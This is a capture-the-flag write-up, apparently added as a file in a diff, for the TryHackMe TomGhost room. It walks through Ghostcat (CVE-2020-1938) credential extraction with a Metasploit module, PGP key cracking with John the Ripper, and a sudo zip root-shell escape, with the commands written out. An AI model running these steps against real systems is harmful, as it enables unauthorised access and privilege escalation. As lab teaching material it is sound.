@@ -1,0 +1,135 @@
+# 👻 TryHackMe: TomGhost Write-up
+
+![Category](Challenge)
+![Difficulty](Easy)
+![Platform](https://tryhackme.com)
+
+## 📝 Executive Summary
+**TomGhost** is a challenge focused on exploiting a critical vulnerability in Apache Tomcat known as **Ghostcat** (CVE-2020-1938). 
+The attack vector involves extracting credentials via the AJP protocol, performing lateral movement by cracking GPG keys, 
+and escalating privileges to root by abusing `sudo` rights on the `zip` binary.
+
+---
+
+## 🛠️ Tools Used
+- **Nmap**: Network discovery.
+- **Metasploit**: Exploiting the Ghostcat vulnerability.
+- **GPG / John the Ripper**: Decrypting PGP keys.
+- **GTFOBins**: Privilege escalation methodology.
+
+---
+
+## 1. Reconnaissance
+
+### Nmap Scan
+I started by scanning the target to identify open ports and services.
+
+$nmap -p- -sV -sC <TARGET_IP>
+Results:
+
+Port 22: SSH (OpenSSH 7.2p2)
+
+Port 53: DNS (Tcpwrapped)
+
+Port 8080: HTTP (Apache Tomcat 9.0.30)
+
+Port 8009: AJP13 (Apache JServ Protocol)
+
+Vulnerability Analysis
+I accessed the web server on port 8080. It was a default Apache Tomcat installation. While I found some example credentials online, the manager portal was inaccessible.
+
+However, the presence of Port 8009 (AJP13) combined with the room name "TomGhost" strongly suggested the Ghostcat Vulnerability (CVE-2020-1938). 
+This vulnerability allows an unauthenticated attacker to read files from the web application.
+
+2. Exploitation (Ghostcat)
+Metasploit
+I used Metasploit to exploit the AJP protocol and attempt to read configuration files containing credentials.
+
+$msfconsole
+$use auxiliary/admin/http/tomcat_ghostcat
+$set RHOSTS <TARGET_IP>
+$run
+Findings: The exploit successfully retrieved the contents of WEB-INF/web.xml. Inside, I found hardcoded credentials for a user:
+
+Username: skyfuxx
+
+Password: 8730281.... 
+
+3. Lateral Movement
+SSH & Enumeration
+I logged in via SSH using the credentials found.
+
+$ssh skyfuxx@<TARGET_IP>
+Upon enumerating the file system, I found two interesting files in skyfuxx's home directory:
+
+credential.pgp (Encrypted file)
+
+tryhackme.asc (PGP Private Key)
+
+Cracking the Key
+To decrypt the .pgp file, I first needed the passphrase for the private key. I transferred both files to my local machine.
+
+Convert Key to Hash: Used gpg2john to convert the private key into a format John the Ripper can understand.
+
+$gpg2john tryhackme.asc > hash
+Crack the Hash: Used john with the rockyou.txt wordlist.
+
+
+$john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Result: The passphrase was successfully cracked (e.g., alexxxxxxxx).
+
+Decrypting Credentials
+With the passphrase, I imported the key and decrypted the file.
+
+$gpg --import tryhackme.asc
+$gpg --decrypt credential.pgp
+Output: This revealed the password for the user merlin.
+
+I switched users:
+
+$su merlin
+# Entered decrypted password
+User Flag: Retrieved user.txt from /home/merlin/.
+{However user flag in merlin directory was readable by skyfuxx}
+
+4. Privilege Escalation
+Sudo Rights Enumeration
+As user merlin, I checked for sudo privileges.
+
+$sudo -l
+  Output: 
+    User merlin may run the following commands on ubuntu:
+        (root : root) NOPASSWD: /usr/bin/zip
+Exploiting Zip (GTFOBins)
+The user is allowed to run zip as root without a password. According to GTFOBins, zip can be used to spawn a shell.
+
+I executed the following commands:
+
+$TF=$(mktemp -u)
+$sudo zip $TF /etc/hosts -T -TT 'sh #'
+$sudo rm $TF
+Result: The command spawned a root shell (#).
+
+
+cat /root/root.txt
+🧠 Technical Breakdown: The Zip Exploit
+How does compressing a file give us a root shell?
+
+zip: The command usually creates archives.
+
+$TF /etc/hosts: We are telling zip to create a temp file archive containing /etc/hosts. This is just dummy data to make the command valid.
+
+-T (Test): This flag tells zip to test the integrity of the archive after creating it.
+
+-TT 'sh #' (Unzip Command): This is the dangerous part. The -TT flag allows the user to specify a custom command to run during the test phase.
+
+We passed 'sh #' as the custom command.
+
+Since zip is running with sudo, the test command (sh) also runs as root.
+
+The # comments out any garbage arguments that zip might try to append to our command.
+
+🏁 Conclusion
+TomGhost is a classic example of why legacy protocols (like AJP) should be disabled if not in use. 
+It also demonstrates the risk of storing sensitive keys (PGP) on shared systems and the dangers of granting sudo permissions on binaries 
+that have "shell escape" functionality like zip.
